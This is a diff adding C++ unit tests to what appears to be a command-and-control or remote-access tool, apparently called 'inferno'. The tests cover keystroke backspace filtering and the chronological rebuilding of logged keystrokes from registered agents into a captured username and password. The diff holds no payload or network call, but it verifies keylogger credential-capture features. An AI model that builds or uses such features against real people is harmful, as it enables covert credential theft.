@@ -100,3 +100,37 @@ void test_analysis_db_persistence() {
 
     std::cout << "[PASS] Database persistence verified." << std::endl;
 }
+
+void test_analysis_backspace_filtering() {
+    std::cout << "[TEST] Testing Backspace filtering..." << std::endl;
+
+    assert(inferno::Analysis::filterBackspaces("y[BACKSPACE]uper") == "uper" && "y[BACKSPACE]uper failed");
+    assert(inferno::Analysis::filterBackspaces("abc[BACKSPACE][BACKSPACE]") == "a" && "Double backspace failed");
+    assert(inferno::Analysis::filterBackspaces("[TAB]sy[BACKSPACE]uper[ENTER]") == "[TAB]super[ENTER]" && "Reconstruction with tags failed");
+    assert(inferno::Analysis::filterBackspaces("[BACKSPACE]test") == "test" && "Prefix backspace failed");
+    assert(inferno::Analysis::filterBackspaces("test[BACKSPACE]") == "tes" && "Suffix backspace failed");
+    assert(inferno::Analysis::filterBackspaces("") == "" && "Empty string failed");
+
+    std::cout << "[PASS] Backspace filtering verified." << std::endl;
+}
+
+void test_analysis_chronological_keylogs() {
+    std::cout << "[TEST] Testing Chronological Keylog Reconstruction..." << std::endl;
+
+    QString test_uuid = "TEST-CHRON-" + QUuid::createUuid().toString(QUuid::WithoutBraces).left(8);
+    
+    // Register agent
+    int agentId = inferno::Inferno_Database::instance().registerAgent(test_uuid, "127.0.0.1", "ChronBox", "Linux");
+    assert(agentId > 0 && "Agent registration failed");
+
+    // Log keylogs in fragments
+    assert(inferno::Inferno_Database::instance().logKeylog(test_uuid, "myusername[TAB]Se"));
+    assert(inferno::Inferno_Database::instance().logKeylog(test_uuid, "cretSuperPass"));
+    assert(inferno::Inferno_Database::instance().logKeylog(test_uuid, "word123[ENTER]"));
+
+    // Fetch and check chronological reconstruction
+    QString reconstructed = inferno::Inferno_Database::instance().getRawKeylogsChronological(test_uuid);
+    assert(reconstructed == "myusername[TAB]SecretSuperPassword123[ENTER]" && "Reconstruction string mismatch");
+
+    std::cout << "[PASS] Chronological keylog reconstruction verified." << std::endl;
+}
